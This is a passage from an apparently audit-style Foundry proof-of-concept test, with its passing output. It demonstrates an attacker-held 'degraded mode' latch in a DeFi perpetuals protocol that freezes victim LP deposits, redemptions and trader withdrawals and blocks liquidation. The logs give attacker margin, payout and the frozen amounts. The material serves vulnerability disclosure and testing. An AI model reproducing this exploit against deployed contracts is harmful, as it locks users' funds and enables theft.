        vm.prank(lpRedeemer);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(redeemId, lpRedeemer, lpRedeemer);
        emit log_named_uint("victim depositor USDG frozen at +3d", juniorVault.pendingDepositRequest(depositId, lpDepositor));
        emit log_named_uint("victim LP redemption shares frozen at +3d (cannot settle or cancel)", lpShares / 2);
        vm.prank(victimTrader);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victimTrader, 1_000e6);
        emit log_named_uint("bystander trader settlement frozen at +3d", clearinghouse.balanceAssets(victimTrader));

        // A keeper cannot liquidate the defended leg through the public Router entrypoint.
        bytes[] memory liqData = _mockPythUpdateData(MOVE_DOWN_PRICE);
        uint256 liqFee = router.pletherOracle().getUpdateFee(liqData);
        (uint256 heldSizeBefore,,,,,,) = engine.positions(attackerShort);
        vm.prank(keeper);
        try router.executeLiquidation{value: liqFee}(attackerShort, liqData) {
            emit log("Router executeLiquidation(held leg) did not revert");
        } catch (bytes memory reason) {
            emit log_named_bytes("Router executeLiquidation(held leg) reverted with", reason);
        }
        (uint256 heldSizeAfter,,,,,,) = engine.positions(attackerShort);
        assertEq(heldSizeAfter, heldSizeBefore, "defended leg is not liquidated");
        assertTrue(engine.degradedMode(), "still latched after the liquidation attempt");

        // 7. Release boundary: only an owner donation of the gap, then clearDegradedMode, ends the freeze.
        uint256 gap = _maxL() - _effectiveAssets();
        emit log_named_uint("owner recap required to clear", gap);
        emit log_named_uint("owner recap as bps of pool", gap * 10_000 / _maxL());
        settlementToken.mint(address(this), gap + 1_000e6);
        settlementToken.approve(address(engine), gap + 1_000e6);
        engine.recapitalizePool(gap + 1_000e6);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner recap + clear releases");
    }
}
```

Output (exit 0):

```
Ran 1 test for test/poc/degraded-latch-hold/ProofAttackerHeldDegradedLatch.t.sol:ProofAttackerHeldDegradedLatchTest
[PASS] test_attackerHeldDegradedLatchFreezesLpAndTraderFunds() (gas: 75802728)
Logs:
  baseline effective assets E: 1002000000000
  effective assets E with victim LP: 1102000000000
  long side envelope: 1099000000000
  short side envelope: 1099000000000
  effective assets E after saturation: 1102000087082
  E - L gap: 3000087082
  buffer target ceil(L*25bps): 2747500000
  attacker margin locked (both legs): 24330756445
  attacker margin as bps of pool: 220
  margin added to the held SHORT leg: 21980000000
  victim LP redemption shares queued: 50000457060317
  victim depositor USDG in vault escrow: 50000000000
  winning-close payout to attacker: 5184545455
  effective assets E after close: 1096815541627
  max liability L after close (held SHORT leg): 1099000000000
  E at +3d: 1096815541627
  L at +3d: 1099000000000
  Router settleLpEpoch at +3d with a fresh Pyth update: reverts HousePool__DegradedMode
  victim depositor USDG frozen at +3d: 50000000000
  victim LP redemption shares frozen at +3d (cannot settle or cancel): 50000457060317
  bystander trader settlement frozen at +3d: 49997686570
  Router executeLiquidation(held leg) reverted with: 0x451cebb2
  owner recap required to clear: 2184458373
  owner recap as bps of pool: 19

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 143.91ms (136.24ms CPU time)

Ran 1 test suite in 144.65ms (143.91ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

